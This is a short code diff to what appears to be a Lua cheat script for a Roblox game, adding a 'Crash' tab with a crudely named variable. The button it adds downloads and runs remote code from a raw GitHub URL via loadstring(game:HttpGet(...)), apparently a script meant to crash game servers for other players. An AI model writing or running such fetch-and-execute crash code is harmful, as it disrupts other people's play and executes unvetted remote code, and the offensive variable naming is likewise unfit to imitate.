@@ -817,3 +817,10 @@ AnimationSector:AddDropdown("Fall", AnimationsName, "Default", false, function(S
         AnimationState.Fall = State
     end
 end)
+
+local gayfortnitesex = Window:CreateTab("Crash")
+
+local gayfortnitesex = gayfortnitesex:CreateSector("Crash", "left")
+gayfortnitesex:AddButton("Crash", function(value)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GS21Official/DH-TB-Crash/main/Swagmode%20crash%20modified%20(better%20FPS)%20crash"))()
+end)
